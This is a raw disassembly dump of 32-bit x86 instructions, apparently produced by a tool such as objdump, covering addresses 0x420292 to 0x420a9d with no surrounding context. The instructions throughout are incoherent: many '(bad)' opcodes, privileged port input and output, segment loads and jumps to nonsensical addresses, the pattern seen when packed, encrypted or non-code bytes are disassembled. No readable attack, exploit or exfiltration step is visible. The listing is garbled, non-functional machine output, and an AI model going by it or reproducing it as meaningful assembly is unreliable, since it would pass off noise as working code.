  420292:	sub    DWORD PTR [esp+eiz*8],ecx
  420295:	dec    edx
  420296:	imul   esp,DWORD PTR [edx],0x45
  420299:	push   ecx
  42029a:	push   es
  42029b:	inc    ecx
  42029c:	in     eax,0x3d
  42029e:	out    dx,eax
  42029f:	adc    BYTE PTR [ecx+esi*8-0x11681f35],dh
  4202a6:	dec    esi
  4202a7:	(bad)  [ecx+ebx*1+0x27]
  4202ab:	into   
  4202ac:	xchg   DWORD PTR [ecx-0x7f0028a2],edi
  4202b2:	mov    ch,0xe5
  4202b4:	(bad)  
  4202b5:	in     eax,dx
  4202b6:	dec    ecx
  4202b7:	mov    ebx,0x889f0b80
  4202bc:	or     bh,BYTE PTR [esi+esi*2+0x18291edd]
  4202c3:	push   0x4d
  4202c5:	arpl   WORD PTR [edx+0x455337af],cx
  4202cb:	imul   edi,DWORD PTR [ebp-0x298d5da0],0x739b4e65
  4202d5:	mov    ds:0xe83b8717,eax
  4202da:	aam    0x10
  4202dc:	mov    esi,0x8f3360da
  4202e1:	cmp    DWORD PTR [ecx],esi
  4202e3:	fadd   DWORD PTR [edx]
  4202e5:	push   0x37
  4202e7:	test   al,0xd9
  4202e9:	fisttp QWORD PTR [ebx+0xb]
  4202ec:	frstor [eax-0x3df81770]
  4202f2:	dec    esp
  4202f3:	shl    BYTE PTR [edx+0x55],1
  4202f6:	mov    edx,0x387ed76d
  4202fb:	and    esi,DWORD PTR [esi-0x6e4d6610]
  420301:	mov    esp,0xd4dc4dc2
  420306:	sbb    BYTE PTR [eax],al
  420308:	mov    edi,0xab6d5ba6
  42030d:	fs adc al,0x6f
  420310:	fdivr  DWORD PTR gs:[ecx-0x7c188293]
  420317:	mov    ebx,0x321c0977
  42031c:	dec    ebx
  42031d:	adc    eax,0x50b8cd0a
  420322:	sub    eax,DWORD PTR [ebp-0x4d15995]
  420328:	push   ecx
  420329:	jle    0x42033f
  42032b:	and    dl,BYTE PTR [edx+0x6c]
  42032e:	add    al,0xb8
  420330:	jns    0x42035f
  420332:	mov    eax,ds:0xa983c2de
  420337:	xchg   dh,ah
  420339:	jne    0x42032f
  42033b:	push   edi
  42033c:	push   0x2c
  42033e:	icebp  
  42033f:	jp     0x420304
  420341:	sbb    eax,0x5a80358a
  420346:	stos   DWORD PTR es:[edi],eax
  420347:	pop    edi
  420348:	test   cl,bh
  42034a:	clc    
  42034b:	les    edx,FWORD PTR [ebp+0x6f4df017]
  420351:	outs   dx,BYTE PTR ds:[esi]
  420352:	mov    ds:0xbd27051b,eax
  420357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420358:	sub    DWORD PTR [eax+0x6a],esi
  42035b:	and    esi,DWORD PTR [edi]
  42035d:	out    0xba,al
  42035f:	sbb    al,0x13
  420361:	mov    cl,0xd0
  420363:	and    eax,eax
  420365:	jge    0x4203d6
  420367:	pop    ss
  420368:	nop
  420369:	cli    
  42036a:	push   es
  42036b:	pop    ecx
  42036c:	dec    edx
  42036d:	retf   
  42036e:	shr    esi,1
  420370:	push   esp
  420371:	ret    0x36d3
  420374:	add    al,0xcb
  420376:	xlat   BYTE PTR ds:[ebx]
  420377:	popa   
  420378:	repnz mov bl,0x32
  42037b:	jmp    0x420303
  42037d:	mov    al,ds:0x52d107dd
  420382:	shr    bh,0xb4
  420385:	mov    eax,0x28157359
  42038a:	out    dx,al
  42038b:	xchg   dh,dl
  42038d:	push   DWORD PTR [ecx+0x26]
  420390:	jg     0x42035f
  420392:	lahf   
  420393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420395:	retf   
  420396:	mov    ss,WORD PTR [ecx]
  420398:	outs   dx,DWORD PTR ds:[esi]
  420399:	clc    
  42039a:	adc    dl,dh
  42039c:	dec    ebx
  42039d:	lea    edi,[esi-0x41]
  4203a0:	jge    0x4203a0
  4203a2:	xor    cl,BYTE PTR [eax-0x4d]
  4203a5:	sub    al,0x98
  4203a7:	data16 jp 0x4203f3
  4203aa:	inc    ebp
  4203ab:	fnstcw WORD PTR [ecx*4+0x2d4064dd]
  4203b2:	out    dx,al
  4203b3:	cmp    BYTE PTR [ebp-0x78],dh
  4203b6:	addr16 (bad) 
  4203b8:	cmp    DWORD PTR [edi-0x3bcfd170],eax
  4203be:	mov    ?,WORD PTR [edx+0xa]
  4203c1:	je     0x42042f
  4203c3:	sub    al,0x4e
  4203c5:	popa   
  4203c6:	mov    cs,WORD PTR [ebp-0x5ee7bd25]
  4203cc:	mov    ah,0xad
  4203ce:	lds    ebp,FWORD PTR [eax+0x7c]
  4203d1:	dec    esp
  4203d2:	nop
  4203d3:	pop    ss
  4203d4:	cli    
  4203d5:	int    0x37
  4203d7:	sub    al,0x8f
  4203d9:	fsubr  st,st(0)
  4203db:	sub    bl,BYTE PTR [edx-0x73061587]
  4203e1:	(bad)
  4203e5:	inc    esp
  4203e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203e7:	adc    DWORD PTR [edi],ecx
  4203e9:	shl    edx,cl
  4203eb:	sbb    DWORD PTR [eax],esp
  4203ed:	adc    al,0xe
  4203ef:	jo     0x420384
  4203f1:	fnsave [esp+eiz*4-0x67f89ce8]
  4203f8:	mov    ch,0xe7
  4203fa:	cdq    
  4203fb:	neg    BYTE PTR [ebx]
  4203fd:	cld    
  4203fe:	imul   esp,DWORD PTR [esi-0x1cef8f58],0xfffffff2
  420405:	into   
  420406:	fidiv  DWORD PTR [ecx-0x672ac23f]
  42040c:	rcr    BYTE PTR [esp+ebp*1],0xf8
  420410:	or     di,dx
  420413:	rcl    DWORD PTR [esi-0x59cf8479],0x36
  42041a:	ins    BYTE PTR es:[edi],dx
  42041b:	loop   0x420457
  42041d:	test   eax,0xd171afa0
  420422:	mov    esi,0xf7c4a6f0
  420427:	sub    al,0x5c
  420429:	call   0x3a89609f
  42042e:	fld    DWORD PTR [ebp+0x359dd54c]
  420434:	(bad)  
  420436:	imul   edx,DWORD PTR [edi-0x10407f73],0x968cdd4
  420440:	mov    al,0x2a
  420442:	xchg   esp,eax
  420443:	je     0x42041d
  420445:	dec    edx
  420446:	jae    0x420480
  420448:	cmp    bl,bl
  42044a:	xor    al,0xa5
  42044c:	cmc    
  42044d:	sbb    DWORD PTR [ebx+0x34],eax
  420450:	mov    ecx,DWORD PTR [ebx-0x44e989a8]
  420456:	call   0x9ae54baa
  42045b:	sar    BYTE PTR [esi],0x2
  42045e:	push   ecx
  42045f:	mov    dh,0xb8
  420461:	sub    ch,BYTE PTR [edx-0x5e99e3eb]
  420467:	cmp    BYTE PTR [ebp+0x5c040c18],cl
  42046d:	sahf   
  42046e:	mov    dh,0xb3
  420470:	shl    dl,1
  420472:	retf   
  420473:	sahf   
  420474:	jb     0x420464
  420476:	and    DWORD PTR [ebp+0x6edd9034],0xffffffc1
  42047d:	dec    esi
  42047e:	dec    ebx
  42047f:	js     0x420423
  420481:	push   0xffffff87
  420483:	xor    al,0x64
  420485:	sbb    ebx,DWORD PTR ds:0x781c7349
  42048b:	xchg   ecx,eax
  42048c:	out    dx,al
  42048d:	inc    esp
  42048e:	sbb    esp,esp
  420490:	cmp    esi,DWORD PTR [ebp+0x3cfbb9ba]
  420496:	call   0xd6ac9b89
  42049b:	add    BYTE PTR [edi+0x7d],cl
  42049e:	imul   ecx,DWORD PTR [ebx],0x17
  4204a1:	in     eax,dx
  4204a2:	inc    ebp
  4204a3:	dec    esp
  4204a4:	mov    eax,0x8d3ec445
  4204a9:	push   cs
  4204aa:	cwde   
  4204ab:	or     esi,ebp
  4204ad:	dec    esp
  4204ae:	ret    
  4204af:	inc    edi
  4204b0:	push   es
  4204b1:	add    eax,0x6a31d30d
  4204b6:	(bad)  
  4204b7:	jae    0x4204d8
  4204b9:	mov    ds:0x329c69ac,eax
  4204be:	pusha  
  4204bf:	adc    DWORD PTR [ecx-0x53],ecx
  4204c2:	inc    ebx
  4204c3:	int    0xc4
  4204c5:	fcom   QWORD PTR [esi+ebx*2]
  4204c8:	lea    eax,[edi+0x6a98d107]
  4204ce:	push   ebp
  4204cf:	xchg   BYTE PTR [edi+0x4103ff97],al
  4204d5:	inc    eax
  4204d6:	loopne 0x4204af
  4204d8:	popa   
  4204d9:	adc    DWORD PTR [edi-0x14de83ba],esi
  4204df:	xor    ah,BYTE PTR [edx+0x36]
  4204e2:	dec    ecx
  4204e3:	retf   0x63be
  4204e6:	lods   eax,DWORD PTR ds:[esi]
  4204e7:	add    eax,0xe9a50b0
  4204ec:	sub    al,0x8
  4204ee:	enter  0xc65b,0x98
  4204f2:	icebp  
  4204f3:	pop    ecx
  4204f4:	xchg   esi,eax
  4204f5:	mov    edx,0xd54253ac
  4204fa:	cmp    eax,0xa795764f
  4204ff:	imul   ebp,ebp,0x6027bdf8
  420505:	mov    ecx,0x1d884d94
  42050a:	xchg   esi,eax
  42050b:	push   ds
  42050c:	jmp    0x369fa6e6
  420511:	cmp    BYTE PTR [edx-0x3506eb6a],cl
  420517:	lds    edi,FWORD PTR [ecx-0x21ade1cd]
  42051d:	into   
  42051e:	ret    0x53bc
  420521:	sbb    DWORD PTR [esi],0xdf17e394
  420527:	xchg   ebp,eax
  420528:	cmc    
  420529:	push   edx
  42052a:	mov    bh,BYTE PTR [ebx]
  42052c:	test   eax,0x41bec5ca
  420531:	shl    DWORD PTR [ecx+0x50],1
  420534:	enter  0xcd83,0x32
  420538:	push   ebx
  420539:	jle    0x420589
  42053b:	mov    dh,0xdf
  42053d:	pop    ebp
  42053e:	addr16 iret 
  420540:	jecxz  0x42055f
  420542:	test   eax,0xe4b36969
  420547:	out    dx,al
  420548:	daa    
  420549:	and    DWORD PTR ds:[esp+ebx*1],esp
  42054d:	push   ebx
  42054e:	out    dx,al
  42054f:	pop    ecx
  420550:	in     al,0xe4
  420552:	jp     0x42055f
  420554:	xchg   ecx,eax
  420555:	icebp  
  420556:	and    DWORD PTR [eax],edi
  420558:	push   ecx
  420559:	pop    edx
  42055a:	dec    esp
  42055b:	push   edx
  42055c:	out    0x87,al
  42055e:	loop   0x42053c
  420560:	or     ebp,DWORD PTR [ebx-0x55908702]
  420566:	adc    BYTE PTR [edi],al
  420568:	xchg   esi,eax
  420569:	fsubr  QWORD PTR [esi-0x5f67e551]
  42056f:	ins    DWORD PTR es:[edi],dx
  420570:	shl    BYTE PTR [esi+0x2715564e],cl
  420576:	scas   eax,DWORD PTR es:[edi]
  420577:	pop    ebp
  420578:	xchg   ecx,eax
  420579:	ror    BYTE PTR [eax],1
  42057b:	fist   DWORD PTR [ecx-0x126ebef]
  420581:	xchg   ebp,eax
  420582:	popf   
  420583:	add    eax,0xcbc58400
  420588:	aad    0x83
  42058a:	inc    edi
  42058b:	ja     0x420585
  42058d:	push   ds
  42058e:	adc    esi,eax
  420590:	es push esp
  420592:	and    ah,BYTE PTR ds:0x1f755c07
  420598:	cmp    bl,bh
  42059a:	ret    
  42059b:	push   esp
  42059c:	xchg   BYTE PTR [edi+edi*2],cl
  42059f:	jg     0x4205fd
  4205a1:	mov    ebp,0x45a37bb9
  4205a6:	or     dl,bh
  4205a8:	outs   dx,BYTE PTR ds:[esi]
  4205a9:	call   0xbe84e56
  4205ae:	mov    dh,0x8e
  4205b0:	mov    DWORD PTR [edx+eiz*1-0x7f37b7b7],edx
  4205b7:	not    DWORD PTR [edx-0x26417736]
  4205bd:	dec    eax
  4205be:	add    DWORD PTR [eax-0x3],edx
  4205c1:	jns    0x420563
  4205c3:	pop    ss
  4205c4:	popa   
  4205c5:	outs   dx,BYTE PTR ds:[esi]
  4205c6:	pop    ebp
  4205c7:	xor    BYTE PTR [eax],0x79
  4205ca:	daa    
  4205cb:	(bad)  
  4205cc:	in     eax,0xb4
  4205ce:	int    0xd2
  4205d0:	pop    ds
  4205d1:	aaa    
  4205d2:	cmp    al,0x6d
  4205d4:	xchg   ebx,eax
  4205d5:	retf   0x7a2b
  4205d8:	pop    ebp
  4205d9:	fadd   st(7),st
  4205db:	out    0xfa,al
  4205dd:	and    esi,eax
  4205df:	sbb    eax,0x57c67f7b
  4205e4:	lods   eax,DWORD PTR ds:[esi]
  4205e5:	xor    eax,0x7727609c
  4205ea:	mov    esi,0xe0f98af7
  4205ef:	test   DWORD PTR ds:0x7d6b75e1,ebx
  4205f5:	(bad)  
  4205f6:	test   al,0xa1
  4205f8:	add    edi,DWORD PTR [ecx]
  4205fa:	xchg   ebp,esi
  4205fc:	xor    DWORD PTR [ebx+0x2],ecx
  4205ff:	scas   eax,DWORD PTR es:[edi]
  420600:	es pop ds
  420602:	pop    esi
  420603:	ja     0x420626
  420605:	ds ret 0x8f33
  420609:	nop
  42060a:	push   eax
  42060b:	mov    DWORD PTR [eax-0x691a9fbc],eax
  420611:	sahf   
  420612:	ss out dx,eax
  420614:	out    dx,al
  420615:	xor    al,0x39
  420617:	mov    esp,0x8e236576
  42061c:	xor    DWORD PTR [ebx+ecx*4+0x4d],edx
  420620:	ret    0xca67
  420623:	or     al,0x99
  420625:	repz sub al,0xa
  420628:	test   dl,bh
  42062a:	pop    ecx
  42062b:	jno    0x420628
  42062d:	sbb    esi,ecx
  42062f:	cmp    BYTE PTR [eax+0x68],ch
  420632:	sub    eax,0x8d319468
  420637:	sub    BYTE PTR [ebx-0x5db716a0],0x99
  42063e:	cmp    esp,DWORD PTR [ecx+0x4e873574]
  420644:	lea    ebx,[ebp-0x1fdf59a7]
  42064a:	pop    ebp
  42064b:	or     al,0x7c
  42064d:	adc    eax,DWORD PTR [eax-0x66]
  420650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420651:	nop
  420652:	push   ss
  420653:	dec    edi
  420654:	nop
  420655:	inc    ebx
  420656:	mov    ah,0x95
  420658:	ds xchg esp,eax
  42065a:	or     ebp,DWORD PTR [ecx-0x5b81340]
  420660:	(bad)  
  420661:	js     0x420656
  420663:	mov    ds:0x8e9eebb,ax
  420669:	xchg   esi,eax
  42066a:	ficomp DWORD PTR [edi-0x73]
  42066d:	xor    al,0xb5
  42066f:	pop    esp
  420670:	dec    edx
  420671:	lods   eax,DWORD PTR ds:[esi]
  420672:	lods   eax,DWORD PTR ds:[esi]
  420673:	mov    cl,0xad
  420675:	mov    cl,0xc0
  420677:	aas    
  420678:	pop    ss
  420679:	loope  0x4206f4
  42067b:	(bad)  
  42067d:	in     eax,0xb
  42067f:	jnp    0x4206ce
  420681:	add    DWORD PTR [edx-0x75b22ba1],0x73
  420688:	xchg   esi,eax
  420689:	into   
  42068a:	pop    eax
  42068b:	out    0x1f,al
  42068d:	mov    bh,0xca
  42068f:	loope  0x420634
  420691:	aaa    
  420692:	pop    ss
  420693:	nop
  420694:	xor    dl,BYTE PTR [eax+0x72cdc1bc]
  42069a:	loope  0x4206b6
  42069c:	jmp    0xbe8c3076
  4206a1:	dec    ebp
  4206a2:	or     BYTE PTR ds:0xe73c66bc,bh
  4206a8:	fisub  WORD PTR [ebp-0x16c70e75]
  4206ae:	stc    
  4206af:	xchg   ebx,eax
  4206b0:	mov    ecx,0xfcf8bdfa
  4206b5:	push   ss
  4206b6:	mov    ch,0xaf
  4206b8:	mov    bl,0xc3
  4206ba:	jmp    0x420718
  4206bc:	mov    edi,0x39a3ab45
  4206c1:	ins    BYTE PTR es:[edi],dx
  4206c2:	rcl    BYTE PTR [edx+edx*2-0x21],cl
  4206c6:	cmp    ebx,edi
  4206c8:	jp     0x4206d5
  4206ca:	xor    al,0x4d
  4206cc:	outs   dx,DWORD PTR ds:[esi]
  4206cd:	push   es
  4206ce:	sub    al,ah
  4206d0:	enter  0x44cb,0x53
  4206d4:	inc    DWORD PTR [ebx+0x5fcec864]
  4206da:	push   eax
  4206db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206dc:	mov    esi,DWORD PTR [ecx]
  4206de:	cmp    eax,0x2aed0505
  4206e3:	lea    esp,[ebx+0x1b2d3a71]
  4206e9:	sahf   
  4206ea:	cmp    al,0xb9
  4206ec:	pop    ebx
  4206ed:	cmc    
  4206ee:	inc    ebx
  4206ef:	mov    cl,0x11
  4206f1:	call   0x46ba:0x17dc8c18
  4206f8:	(bad)  
  4206f9:	repnz jecxz 0x42074c
  4206fc:	mov    dh,0xa2
  4206fe:	pushf  
  4206ff:	inc    eax
  420700:	sub    dh,BYTE PTR [esi]
  420702:	fs (bad) 
  420704:	int    0xcb
  420706:	ins    DWORD PTR es:[edi],dx
  420707:	add    eax,0x79fcaa2d
  42070c:	ds (bad) 
  42070e:	and    al,0x5e
  420710:	adc    eax,0xc30a9b05
  420715:	jmp    0x8111e66b
  42071a:	inc    esi
  42071b:	imul   ebp,DWORD PTR [edi+0x4232226d],0x74
  420722:	and    DWORD PTR [eax+0x1e6aac1d],esi
  420728:	rcr    dh,1
  42072a:	pop    ebp
  42072b:	aam    0x8b
  42072d:	in     eax,0x4c
  42072f:	sub    dh,BYTE PTR [ecx-0x7e]
  420732:	mov    ah,0x84
  420734:	sbb    BYTE PTR fs:[ebx],bl
  420737:	sbb    edi,DWORD PTR [edi-0x52]
  42073a:	jmp    0x420726
  42073c:	adc    ch,BYTE PTR [eax+0x187c3b17]
  420742:	leave  
  420743:	mov    al,ds:0x9b4ae4ed
  420748:	cli    
  420749:	popf   
  42074a:	adc    BYTE PTR [ebx+ecx*4+0xf030124],0xd3
  420752:	inc    esi
  420753:	mov    db5,ebp
  420756:	cmp    ecx,edx
  420758:	sbb    al,bh
  42075a:	aad    0x7e
  42075c:	sub    bl,bl
  42075e:	lods   eax,DWORD PTR ds:[si]
  420760:	and    bl,BYTE PTR [edx+0x3ef0c60f]
  420766:	xchg   BYTE PTR [ecx-0x59],ah
  420769:	mov    esp,0xd225ddb6
  42076e:	mov    esi,0x513c14c6
  420773:	arpl   WORD PTR [edx+0x752fbea9],dx
  420779:	xor    BYTE PTR [eax],0x78
  42077c:	mov    al,0xcc
  42077e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42077f:	rcr    BYTE PTR [ebx],0x77
  420782:	pop    ebp
  420783:	fwait
  420784:	scas   al,BYTE PTR es:[edi]
  420785:	into   
  420786:	jns    0x4207a5
  420788:	jbe    0x420751
  42078a:	test   BYTE PTR [edi+0x6608266f],dl
  420790:	inc    ecx
  420791:	fdiv   QWORD PTR [ebp+0x480c7200]
  420797:	(bad)  
  420798:	push   esp
  420799:	inc    edx
  42079a:	lods   al,BYTE PTR ds:[esi]
  42079b:	jge    0x420724
  42079d:	mov    DWORD PTR [esi+0x54],eax
  4207a0:	mov    ecx,0xeb55b9a5
  4207a5:	push   ebx
  4207a6:	sub    BYTE PTR [edi+0x26b51054],al
  4207ac:	adc    DWORD PTR [esi+ebx*8+0xf6f6c87],esp
  4207b3:	pop    ss
  4207b4:	nop
  4207b5:	adc    ax,0x344e
  4207b9:	repnz adc eax,0x302861c8
  4207bf:	rcr    bh,cl
  4207c1:	xchg   edi,eax
  4207c2:	dec    ecx
  4207c3:	lods   eax,DWORD PTR ds:[esi]
  4207c4:	mov    al,ds:0x9e0e79f5
  4207c9:	sahf   
  4207ca:	xor    BYTE PTR [ebp+edi*1-0x5af600b4],cl
  4207d1:	sbb    cl,BYTE PTR [ecx+0x26]
  4207d4:	les    edx,FWORD PTR [edi+0x25442084]
  4207da:	add    ax,0xbb4f
  4207de:	adc    eax,0x12efaa31
  4207e3:	in     al,dx
  4207e4:	mov    ecx,DWORD PTR [esi-0x22]
  4207e7:	cmp    al,0xa8
  4207e9:	out    0xef,eax
  4207eb:	clc    
  4207ec:	push   esi
  4207ed:	jmp    0x9aa9e7a8
  4207f2:	gs cld 
  4207f4:	sub    al,0x44
  4207f6:	lahf   
  4207f7:	test   al,0x17
  4207f9:	cmp    ah,ch
  4207fb:	add    ch,BYTE PTR [edi]
  4207fd:	mov    eax,ds:0x61b56289
  420802:	cmp    esi,ebx
  420804:	es xchg ebp,eax
  420806:	xor    al,0x6b
  420808:	jg     0x4207a2
  42080a:	inc    eax
  42080b:	rcl    DWORD PTR [eax],1
  42080d:	mov    ch,BYTE PTR [eax+0x387df420]
  420813:	loopne 0x420806
  420815:	dec    esp
  420816:	scas   eax,DWORD PTR es:[edi]
  420817:	sbb    al,0x88
  420819:	pop    ss
  42081a:	cmp    BYTE PTR [eax-0x74],bh
  42081d:	fst    QWORD PTR [esi+edx*4+0x48]
  420821:	(bad)  [edi+0x60a42e31]
  420827:	dec    ecx
  420828:	rol    esp,1
  42082a:	ja     0x420860
  42082c:	pop    ebx
  42082d:	sbb    DWORD PTR [ebp+0x2551c282],ebx
  420833:	mov    ecx,0xae12b590
  420838:	inc    esp
  420839:	or     DWORD PTR [edi+eiz*8+0x24],eax
  42083d:	mov    eax,0x937e7d80
  420842:	push   ss
  420843:	test   BYTE PTR [ebp+edx*8+0x69],bl
  420847:	(bad)  
  420848:	(bad)  
  420849:	dec    ebp
  42084a:	mov    ch,0x46
  42084c:	gs jle 0x420829
  42084f:	outs   dx,DWORD PTR ds:[esi]
  420850:	or     eax,0x837eadb5
  420855:	inc    eax
  420856:	imul   edi,DWORD PTR [ebx],0x13b27667
  42085c:	adc    bh,BYTE PTR [esi+ebx*1]
  42085f:	call   0xec95dee7
  420864:	push   ds
  420865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420866:	stc    
  420867:	rol    BYTE PTR [eax],1
  420869:	xchg   esp,eax
  42086a:	sub    eax,0x249691d1
  42086f:	jmp    0x9a31:0x582b9965
  420876:	dec    ecx
  420877:	and    bl,BYTE PTR [edi]
  420879:	leave  
  42087a:	arpl   cx,dx
  42087c:	(bad)  
  42087d:	push   ebp
  42087e:	cmp    esi,DWORD PTR [eax-0x5]
  420881:	clc    
  420882:	ins    DWORD PTR es:[edi],dx
  420883:	pop    edx
  420884:	adc    al,0x80
  420886:	mov    esi,0xaa6c0346
  42088b:	dec    esi
  42088c:	sub    eax,0x417bd90f
  420891:	cmp    eax,DWORD PTR [eax+0x3b]
  420894:	jmp    0xa98:0x57fab3d7
  42089b:	loop   0x42091b
  42089d:	push   esi
  42089e:	jns    0x420909
  4208a0:	adc    al,BYTE PTR [esi]
  4208a2:	mov    ah,BYTE PTR [ecx+0x3ee28165]
  4208a8:	test   eax,0xfa82d23
  4208ad:	nop
  4208ae:	jp     0x4208ab
  4208b0:	mov    al,ds:0x50633f05
  4208b5:	adc    edi,DWORD PTR [edi+esi*4-0x6fa3c6b0]
  4208bc:	je     0x4208df
  4208be:	and    BYTE PTR [esi],dh
  4208c0:	push   es
  4208c1:	pop    edi
  4208c2:	mov    ebp,0x150d52a1
  4208c7:	das    
  4208c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208c9:	ds in  eax,0x99
  4208cc:	pop    ebx
  4208cd:	lds    esi,FWORD PTR [ecx+0x5b44e040]
  4208d3:	pop    ebp
  4208d4:	in     al,dx
  4208d5:	sub    eax,0xb1b01e9f
  4208da:	idiv   DWORD PTR [eax+0xf250168]
  4208e0:	(bad)  [eax]
  4208e2:	js     0x420879
  4208e4:	pop    ecx
  4208e5:	adc    al,0x3f
  4208e7:	inc    ebp
  4208e8:	lahf   
  4208e9:	dec    sp
  4208eb:	je     0x4208cb
  4208ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208ee:	or     edi,DWORD PTR [edi]
  4208f0:	out    0x1a,al
  4208f2:	jnp    0x4208ec
  4208f4:	or     al,0xf9
  4208f6:	xchg   edi,eax
  4208f7:	adc    eax,0x5567df7b
  4208fc:	and    BYTE PTR gs:[ebp+ecx*8-0x31],bh
  420901:	xchg   esi,eax
  420902:	pop    ds
  420903:	xor    bh,BYTE PTR ds:0xadd9b443
  420909:	xchg   ebp,eax
  42090a:	test   DWORD PTR [eax+0x4],0x4797292
  420911:	sub    ebx,DWORD PTR [esi]
  420913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420914:	xlat   BYTE PTR ds:[ebx]
  420915:	add    eax,0x5d1c70ce
  42091a:	xor    al,0xe3
  42091c:	aas    
  42091d:	push   ebp
  42091e:	mov    ds:0x3ab2c397,al
  420923:	jb     0x4208b6
  420925:	push   edx
  420926:	jg     0x4208aa
  420928:	adc    ecx,edi
  42092a:	and    BYTE PTR [esi-0x6d7f2c2c],bh
  420930:	aaa    
  420931:	and    eax,0x3e70d175
  420936:	add    al,0x18
  420938:	sub    al,0xf
  42093a:	and    ebp,DWORD PTR [ecx]
  42093c:	ds mov dl,0xf0
  42093f:	arpl   WORD PTR [ebx-0x4f5165fc],sp
  420945:	xchg   edx,eax
  420946:	and    edx,DWORD PTR [edx-0x709c36b]
  42094c:	fbld   TBYTE PTR [ebp-0xe]
  42094f:	out    0xe2,al
  420951:	aas    
  420952:	nop
  420953:	mov    bh,0xc0
  420955:	psraw  mm7,QWORD PTR [ebp+0xc0945bc]
  42095c:	(bad)  
  42095d:	bound  edx,QWORD PTR [esp+esi*1]
  420960:	xchg   ebp,eax
  420961:	and    DWORD PTR [esi-0x3ffd509a],esi
  420967:	and    edx,ecx
  420969:	mov    edi,esi
  42096b:	push   ss
  42096c:	sbb    eax,0xc445a6db
  420971:	addr16 push 0x12
  420974:	xor    eax,0xb2ae14ab
  420979:	cli    
  42097a:	lock push ebx
  42097c:	dec    esp
  42097d:	aas    
  42097e:	xchg   DWORD PTR [ecx-0x3340d98c],edi
  420984:	inc    ebp
  420986:	jge    0x42092c
  420988:	out    0x51,al
  42098a:	out    0xaf,al
  42098c:	mov    ds,WORD PTR [ebp-0x664a8e94]
  420992:	or     eax,0x63cabb0
  420997:	jae    0x420947
  420999:	sub    DWORD PTR [eax+0x58ef87d1],0xc2b8bbd0
  4209a3:	aad    0x26
  4209a5:	xor    DWORD PTR [eax-0x7],esi
  4209a8:	mov    ebx,ds
  4209aa:	mov    ch,0x4b
  4209ac:	(bad)  
  4209ad:	cli    
  4209ae:	cld    
  4209af:	push   es
  4209b0:	and    eax,esp
  4209b2:	(bad)  
  4209b3:	pop    edi
  4209b4:	xor    al,0xaf
  4209b6:	mov    eax,0x9934ec5d
  4209bb:	fsubrp st(6),st
  4209bd:	xchg   ebp,eax
  4209be:	adc    DWORD PTR [ecx+0x51],esp
  4209c1:	dec    edi
  4209c2:	cmp    eax,0x3121dadc
  4209c7:	dec    edx
  4209c8:	ret    0x5a43
  4209cb:	sbb    eax,0xf8a8abe0
  4209d0:	jecxz  0x420a3e
  4209d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209d3:	dec    bx
  4209d5:	cmp    BYTE PTR [edi-0x248a1778],ch
  4209db:	mov    edi,0xd8956209
  4209e0:	fiadd  DWORD PTR [edx+0x472dbec5]
  4209e6:	or     al,0x1f
  4209e8:	cmp    bh,BYTE PTR [ebx]
  4209ea:	jp     0x420993
  4209ec:	xor    DWORD PTR [eax-0x6a],0xffffffce
  4209f0:	bound  ebp,QWORD PTR [ebp-0x50]
  4209f3:	mov    es,WORD PTR [ebx]
  4209f5:	aad    0xa4
  4209f7:	pop    ebx
  4209f8:	inc    ebx
  4209f9:	aaa    
  4209fa:	mov    ecx,0xda78ed86
  4209ff:	inc    eax
  420a00:	add    DWORD PTR [eax],0xffffff8e
  420a03:	mov    cl,0x27
  420a05:	xlat   BYTE PTR ds:[ebx]
  420a06:	mov    DWORD PTR [edx],0x9d7414e
  420a0c:	mov    WORD PTR [ebx+0x1c8265a4],ds
  420a12:	mov    ch,0x34
  420a14:	sub    al,0xa9
  420a16:	in     eax,dx
  420a17:	dec    ebx
  420a18:	sbb    esp,DWORD PTR [ebp+eax*4-0x226a18a6]
  420a1f:	cmp    DWORD PTR [edx+ebx*8+0x58],eax
  420a23:	(bad)  
  420a24:	in     al,dx
  420a25:	cld    
  420a26:	adc    esp,DWORD PTR [ebp-0x4f]
  420a29:	push   edi
  420a2a:	dec    ebx
  420a2b:	arpl   WORD PTR [ebp+0x47d0a1cd],ax
  420a31:	mov    ch,0x78
  420a33:	push   0x8
  420a35:	popa   
  420a36:	out    dx,al
  420a37:	iret   
  420a38:	imul   ebx,DWORD PTR [esi-0x77],0xffffffef
  420a3c:	cdq    
  420a3d:	shl    ah,cl
  420a3f:	cmp    eax,edi
  420a41:	push   cs
  420a42:	addr16 das 
  420a44:	cmp    DWORD PTR [edi-0x28],ebp
  420a47:	stos   DWORD PTR es:[edi],eax
  420a48:	jbe    0x420a00
  420a4a:	jb     0x420a7f
  420a4c:	enter  0x1e16,0x7
  420a50:	add    BYTE PTR [ebp-0x32dff872],al
  420a56:	clc    
  420a57:	jo     0x420a21
  420a59:	(bad)  
  420a5b:	test   cl,cl
  420a5d:	add    eax,DWORD PTR [eax+0xa682f15]
  420a63:	dec    ebp
  420a64:	sti    
  420a65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a66:	sbb    ah,BYTE PTR [eax-0x3d8764e3]
  420a6c:	ins    BYTE PTR es:[edi],dx
  420a6d:	fist   WORD PTR [ebp+0x658bf847]
  420a73:	ss icebp 
  420a75:	or     dl,cl
  420a77:	cmc    
  420a78:	loop   0x420aaa
  420a7a:	add    BYTE PTR [eax-0x49],ah
  420a7d:	push   esi
  420a7e:	enter  0xfcfb,0x27
  420a82:	out    dx,al
  420a83:	int3   
  420a84:	imul   BYTE PTR [ebx-0x3c]
  420a87:	push   ss
  420a88:	in     eax,0xc9
  420a8a:	xor    ecx,DWORD PTR [ebx-0x3a]
  420a8d:	sti    
  420a8e:	pop    eax
  420a8f:	cmp    DWORD PTR [eax+0x39af5e75],edi
  420a95:	inc    esp
  420a96:	mov    esi,0xfd0e4f5f
  420a9b:	mov    BYTE PTR [edi],ch
  420a9d:	adc    BYTE PTR [edx+ebx*4],al
